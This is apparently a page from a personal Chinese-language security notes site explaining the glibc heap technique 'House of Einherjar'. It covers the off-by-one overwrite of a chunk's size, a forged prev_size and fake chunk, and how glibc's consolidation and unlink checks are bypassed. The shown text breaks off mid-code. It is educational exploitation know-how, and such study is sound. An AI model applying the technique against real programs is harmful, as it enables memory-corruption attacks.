@@ -1,0 +1,1157 @@
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Welcome to Allen Hong's Notes. This site records some of my notes. Hope it can help you a bit. You're also welcome to discuss with me and help point out some of this site's issues.">
+      
+      
+        <meta name="author" content="Allen Hong">
+      
+      
+        <link rel="canonical" href="https://masterallen.github.io/%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/wiki/03.heap/06.consolidate/01.house_of_einherjar/">
+      
+      
+        <link rel="prev" href="../../05.large/01.large_bin_attack/">
+      
+      
+        <link rel="next" href="../02.overlapping_chunk/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../../../assets/images/favicon.png">
+      <meta name="generator" content="zensical-0.0.40">
+    
+    
+      
+        <title>House of einherjar - Allen Hong's Notes</title>
+      
+    
+    
+      
+        
+      
+      <link rel="stylesheet" href="../../../../../../assets/stylesheets/modern/main.fba56155.min.css">
+      
+        
+          
+        
+        <link rel="stylesheet" href="../../../../../../assets/stylesheets/modern/palette.dfe2e883.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="https://unpkg.com/katex@0/dist/katex.min.css">
+    
+    <script>__md_scope=new URL("../../../../../..",location),__md_scope.pathname.endsWith("/")||(__md_scope=new URL(__md_scope.pathname+"/",location)),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,_=__md_scope)=>JSON.parse(t.getItem(_.pathname+"."+e)),__md_set=(e,t,_=localStorage,a=__md_scope)=>{try{_.setItem(a.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
+    
+      
+  
+
+
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-WSXPFTNRTD"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-WSXPFTNRTD",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-WSXPFTNRTD",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+  
+    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
+  
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer" aria-label="Navigation"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#house-of-einherjar" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../../.." title="Allen Hong&#x27;s Notes" class="md-header__button md-logo" aria-label="Allen Hong's Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer" aria-label="Navigation">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-menu" viewBox="0 0 24 24"><path d="M4 5h16M4 12h16M4 19h16"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Allen Hong's Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              House of einherjar
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="indigo"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search" aria-label="Search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-search" viewBox="0 0 24 24"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog" aria-label="Search">
+  <button type="button" class="md-search__button">
+    Search
+  </button>
+</div>
+      
+    
+    <div class="md-header__source">
+      
+        <a href="https://github.com/masterAllen" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2026 Fonticons, Inc.--><path fill="currentColor" d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    My Github Link
+  </div>
+</a>
+      
+    </div>
+  </nav>
+  
+</header>
+    
+    
+    <div class="custom-sidebar-shell custom-page-shell md-grid">
+        
+          
+            
+            <div class="md-sidebar md-sidebar--primary" data-md-type="navigation" >
+              <div class="md-sidebar__scrollwrap">
+                <div class="md-sidebar__inner">
+                  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<div data-shared-navigation="../../../../../../navigation/shared/group-2-d7abe878c55d.html" data-site-root="../../../../../../" aria-busy="true">
+  <a href="../../../../../..">加载栏目目录…</a>
+</div>
+<script src="../../../../../../javascripts/shared-navigation.js"></script>
+
+<script src="../../../../../../javascripts/sidebar-title-tooltip.js"></script>
+<script src="../../../../../../javascripts/sidebar-scroll-position.js"></script>
+                </div>
+              </div>
+            </div>
+          
+        
+    </div>
+    
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+    <div class="md-container" data-md-component="container"
+         data-shared-navigation-target="../../../../../../navigation/shared/group-2-d7abe878c55d.html"
+         data-site-root="../../../../../../"
+         data-navigation-hidden="false">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../../Main/" class="md-tabs__link">
+          
+  
+  Main
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../../../" class="md-tabs__link">
+          
+  
+  系统性知识
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../../%E4%B9%A6%E7%B1%8D%E8%AE%B0%E5%BD%95/" class="md-tabs__link">
+          
+  
+  书籍记录
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../../%E7%AE%97%E6%B3%95%E8%AE%B0%E5%BD%95/" class="md-tabs__link">
+          
+  
+  算法记录
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../../CheatSheet/" class="md-tabs__link">
+          
+  
+  CheatSheet
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../../Language/" class="md-tabs__link">
+          
+  
+  Language
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../../Vision/CMOS%E7%9A%84%E7%90%86%E8%A7%A3/01.CMOS%E5%92%8CCCD%E7%A9%B6%E7%AB%9F%E5%8C%BA%E5%88%AB%E5%9C%A8%E5%93%AA%E9%87%8C/" class="md-tabs__link">
+          
+  
+  Vision
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../../IP%E5%9C%B0%E7%90%86%E5%AE%9A%E4%BD%8D/%E6%95%B4%E4%BD%93%E7%9B%AE%E5%BD%95%E6%A0%91/" class="md-tabs__link">
+          
+  
+  IP 地理定位
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../../About/" class="md-tabs__link">
+          
+  
+  About
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../../%E5%BD%92%E6%A1%A3/%E4%BF%AE%E6%94%B9%E6%97%B6%E9%97%B4/" class="md-tabs__link">
+          
+  
+  归档
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <div class="custom-page-shell md-grid">
+        <div class="custom-main-area">
+          <main class="md-main" data-md-component="main">
+            <div class="md-main__inner md-grid">
+              
+                
+                  
+                  <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                    <div class="md-sidebar__scrollwrap">
+                      
+                        
+                        
+                        
+                          
+                        
+                        
+                          <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+                          <div class="md-sidebar-button__wrapper">
+                            <label class="md-sidebar-button" for="__toc"></label>
+                          </div>
+                        
+                      
+                      <div class="md-sidebar__inner">
+                        
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        前置知识
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        基础知识
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        细节说明
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="细节说明">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Step 1
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Step 2
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Step 3
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Step 4
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Step 5
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-6" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Step 6
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        补充
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                      </div>
+                    </div>
+                  </div>
+                
+              
+              
+                <div class="md-content" data-md-component="content">
+                  
+                    
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../../../../../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    欢迎
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../../../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    系统性知识
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../../compilebackdoor/%E7%BB%99%E7%BC%96%E8%AF%91%E5%99%A8%E5%8A%A0%E5%90%8E%E9%97%A8/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    信息安全
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    wiki
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    03.heap
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="././" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    06.consolidate
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+                  
+                  <article class="md-content__inner md-typeset">
+                    
+                      
+                        
+  
+  
+
+
+<h1 id="house-of-einherjar">House of einherjar</h1>
+<div class="file-actions" data-image-edit-revision="c4e68c65939277ebf01fa866dd6a398f28b53033133a51997da55b165ccfd3f5" data-title-link="true"><a href="blog-edit://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cwiki%5C03.heap%5C06.consolidate%5C01.house_of_einherjar.md" class="file-action-link" title="使用本地应用打开源文件">本地编辑</a> | <a href="blog-folder://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cwiki%5C03.heap%5C06.consolidate" class="file-action-link" title="使用文件资源管理器打开源文件所在目录">打开本地目录</a> | <span class="file-action-link" style="cursor: pointer;" data-copy="D:\Blog\done\系统性知识\信息安全\wiki\03.heap\06.consolidate\01.house_of_einherjar.md">复制路径</span></div>
+
+<p>很难总结它的思想是什么，我感觉就是有 overflow write 的一种攻击手段吧。</p>
+<blockquote>
+<p>要求：<br />
+  1. 只需 off by one，即可以复写某块下一个块的 <code>size</code>，其中 <code>size</code> 只用改最后一位就可以了。<br />
+  2. 知道 heap 地址</p>
+<p>效果：变体版的 Doube Reference，是一个指针指向内存 A，另一个指针指向内存 B，而 A 包含了 B</p>
+</blockquote>
+<h2 id="_1">前置知识</h2>
+<ol>
+<li><a href="../../01.tcache/02.tcache_poisoning/">safe linking</a></li>
+</ol>
+<h2 id="_2">基础知识</h2>
+<p>要知道 chunk 是由重叠利用的部分。<code>prev_size</code> 的作用是如果 <code>free(p)</code>，发现 <code>p-&gt;size</code> 最后一位是 0，说明上一个块也是 freed，那么就会根据 <code>prev_size</code> 去找上一块，然后合并。</p>
+<p><strong><code>prev_size</code> 只有在 prev 是 freed 的时候才会生效</strong>，之前可能会担心 <code>prev-&gt;data</code> 和 <code>prev_size</code> 冲突了，但挺巧妙的：</p>
+<ul>
+<li>如果 prev 是 malloced，那么 <code>free(p)</code> 的时候就不会往上找 prev，即不需要 <code>prev_size</code>。因此 <code>prev_size</code> 无意义，那此时正好 <code>prev-&gt;data</code> 有意义。</li>
+<li>如果 prev 是 freed，那么 <code>prev_size</code> 有意义；而由于是 freed，正好 <code>prev-&gt;data</code> 无意义。</li>
+</ul>
+<p><img alt="" src="../../../../../../asset/image/ccaf30fc3911ad7607f494ca5f613905/20260105112259.png" /></p>
+<h2 id="_3">细节说明</h2>
+<p>通过 how2heap 的例题讲解，代码有修改，有些语法是错的。懒得自己调试了，图片和数据很多来源于<a href="https://www.kn0sky.com/?p=288b423d-0c72-47b6-acd3-d835e50a3acd">这篇文章</a>。</p>
+<h3 id="step-1">Step 1</h3>
+<p>申请三块内存，此时的堆空间如下。</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-0-1"><span class="linenos" data-linenos="1 "></span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x38</span><span class="p">);</span>
+</span><span id="__span-0-2"><span class="linenos" data-linenos="2 "></span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">);</span>
+</span><span id="__span-0-3"><span class="linenos" data-linenos="3 "></span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">);</span><span class="w"> </span><span class="c1">// 后续我们希望 free(c) 触发合并，所以 c 不能是 fastbin 大小</span>
+</span></code></pre></div>
+<p><img alt="" src="../../../../../../asset/image/ccaf30fc3911ad7607f494ca5f613905/20260105115743.png" /></p>
+<h3 id="step-2">Step 2</h3>
+<p>chunkB 修改 chunkC 的 <code>prev_size</code>，由于 chunkB 是 malloced，所以这个修改是可以的。<strong>然后溢出修改 chunkC 的 <code>size</code></strong>：</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-1-1"><span class="linenos" data-linenos="1 "></span><span class="c1">// 修改 chunkC 的 prev_size，这里可以自然修改，因为这就是 chunkB-&gt;data 的末尾</span>
+</span><span id="__span-1-2"><span class="linenos" data-linenos="2 "></span><span class="n">b</span><span class="p">[</span><span class="mh">0x20</span><span class="o">:</span><span class="mh">0x28</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x60</span><span class="p">;</span><span class="w"> </span>
+</span><span id="__span-1-3"><span class="linenos" data-linenos="3 "></span>
+</span><span id="__span-1-4"><span class="linenos" data-linenos="4 "></span><span class="kt">int</span><span class="w"> </span><span class="n">real_b_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc_usable_size</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
+</span><span id="__span-1-5"><span class="linenos" data-linenos="5 "></span>
+</span><span id="__span-1-6"><span class="linenos" data-linenos="6 "></span><span class="c1">// VULNERABILITY</span>
+</span><span id="__span-1-7"><span class="linenos" data-linenos="7 "></span><span class="n">b</span><span class="p">[</span><span class="n">real_b_size</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+</span></code></pre></div>
+<p>由于我们修改了 <code>c-&gt;size</code> 的末尾 bit，如果 <code>free(c)</code> 的时候，会认为 <code>c</code> 的上一个块也已经是 freed，然后进行合并。我们的目标是合并成一个大块的时候，malloced chunkB 在 freed C 中，所以我们把 <code>prev_size</code> 改成了 0x60，即指向了红色框。改成 0x50 也是可以的，只要能保住 chunkB 即可。</p>
+<p><img alt="" src="../../../../../../asset/image/ccaf30fc3911ad7607f494ca5f613905/20260106120153.png" /></p>
+<h3 id="step-3">Step 3</h3>
+<p>就上面那个图，此时 <code>free(c)</code> 肯定会有问题，因为他认为红色框的块也是 freed，会合并。这个红色框头部啥也没有，肯定会被检查。这里直接先给设计：</p>
+<p><img alt="" src="../../../../../../asset/image/ccaf30fc3911ad7607f494ca5f613905/20260106121934.png" /></p>
+<p>检查的代码这里挑几个重点来讲，下面是向低地址合并，即不断往前找的代码。可以看到有一个检查 <code>chunksize(p) != prevsize</code>，所以红色框的 <code>size</code> 我们要改成 <code>c-&gt;prevsize</code> 即 0x60。</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-2-1"><span class="linenos" data-linenos=" 1 "></span><span class="c1">// 从后向前合并</span>
+</span><span id="__span-2-2"><span class="linenos" data-linenos=" 2 "></span><span class="cm">/* consolidate backward */</span>
+</span><span id="__span-2-3"><span class="linenos" data-linenos=" 3 "></span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">prev_inuse</span><span class="p">(</span><span class="n">p</span><span class="p">))</span><span class="w"> </span><span class="c1">// 如果上一个chunk是空闲的</span>
+</span><span id="__span-2-4"><span class="linenos" data-linenos=" 4 "></span><span class="p">{</span><span class="w">   </span>
+</span><span id="__span-2-5"><span class="linenos" data-linenos=" 5 "></span><span class="w">    </span><span class="n">prevsize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">prev_size</span><span class="p">(</span><span class="n">p</span><span class="p">);</span><span class="w">  </span>
+</span><span id="__span-2-6"><span class="linenos" data-linenos=" 6 "></span><span class="w">    </span><span class="n">size</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">prevsize</span><span class="p">;</span>
+</span><span id="__span-2-7"><span class="linenos" data-linenos=" 7 "></span>
+</span><span id="__span-2-8"><span class="linenos" data-linenos=" 8 "></span><span class="w">    </span><span class="c1">// 安全检查</span>
+</span><span id="__span-2-9"><span class="linenos" data-linenos=" 9 "></span><span class="w">    </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="p">((</span><span class="kt">long</span><span class="p">)</span><span class="n">prevsize</span><span class="p">));</span>
+</span><span id="__span-2-10"><span class="linenos" data-linenos="10 "></span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">__glibc_unlikely</span><span class="p">(</span><span class="n">chunksize</span><span class="p">(</span><span class="n">p</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">prevsize</span><span class="p">))</span>
+</span><span id="__span-2-11"><span class="linenos" data-linenos="11 "></span><span class="w">        </span><span class="n">malloc_printerr</span><span class="p">(</span><span class="s">&quot;corrupted size vs. prev_size while consolidating&quot;</span><span class="p">);</span>
+</span><span id="__span-2-12"><span class="linenos" data-linenos="12 "></span>
+</span><span id="__span-2-13"><span class="linenos" data-linenos="13 "></span><span class="w">    </span><span class="c1">// 断链上一个chunk</span>
+</span><span id="__span-2-14"><span class="linenos" data-linenos="14 "></span><span class="w">    </span><span class="n">unlink_chunk</span><span class="p">(</span><span class="n">av</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">);</span>
+</span><span id="__span-2-15"><span class="linenos" data-linenos="15 "></span><span class="p">}</span>
+</span></code></pre></div>
+<p>在上面代码最后一句是解链，它的代码如下，此时的 <code>p</code> 就是红色框。对于安全检查 1，红色框中的 <code>size</code> 改成 0x60 可以通过。对于安全检查 2，则是检查 <code>fd</code> 和 <code>bk</code> 指针，如上图所示，我们设置成了 <code>fd = bk = p</code>，巧妙地顺利通过。因此这里隐含了一个要求：<strong>我们需要知道 heap 地址</strong>。</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-3-1"><span class="linenos" data-linenos=" 1 "></span><span class="cm">/* Take a chunk off a bin list.  */</span>
+</span><span id="__span-3-2"><span class="linenos" data-linenos=" 2 "></span><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">unlink_chunk</span><span class="p">(</span><span class="n">mstate</span><span class="w"> </span><span class="n">av</span><span class="p">,</span><span class="w"> </span><span class="n">mchunkptr</span><span class="w"> </span><span class="n">p</span><span class="p">)</span>
+</span><span id="__span-3-3"><span class="linenos" data-linenos=" 3 "></span><span class="p">{</span>
+</span><span id="__span-3-4"><span class="linenos" data-linenos=" 4 "></span><span class="w">    </span><span class="c1">// 安全检查 1：如果当前chunk的大小不等于next chunk的prev_size，说明被篡改了数据，报错</span>
+</span><span id="__span-3-5"><span class="linenos" data-linenos=" 5 "></span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">chunksize</span><span class="p">(</span><span class="n">p</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">prev_size</span><span class="p">(</span><span class="n">next_chunk</span><span class="p">(</span><span class="n">p</span><span class="p">)))</span>
+</span><span id="__span-3-6"><span class="linenos" data-linenos=" 6 "></span><span class="w">        </span><span class="n">malloc_printerr</span><span class="p">(</span><span class="s">&quot;corrupted size vs. prev_size&quot;</span><span class="p">);</span>
+</span><span id="__span-3-7"><span class="linenos" data-linenos=" 7 "></span>
+</span><span id="__span-3-8"><span class="linenos" data-linenos=" 8 "></span><span class="w">    </span><span class="n">mchunkptr</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
+</span><span id="__span-3-9"><span class="linenos" data-linenos=" 9 "></span><span class="w">    </span><span class="n">mchunkptr</span><span class="w"> </span><span class="n">bk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+</span><span id="__span-3-10"><span class="linenos" data-linenos="10 "></span>
+</span><span id="__span-3-11"><span class="linenos" data-linenos="11 "></span><span class="w">    </span><span class="c1">// 安全检查 2：如果当前chunk的fd的bk不等于当前chunk，或者bk的fd不等于当前chunk，说明双向链表链接出错，报错</span>
+</span><span id="__span-3-12"><span class="linenos" data-linenos="12 "></span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">__builtin_expect</span><span class="p">(</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">))</span>
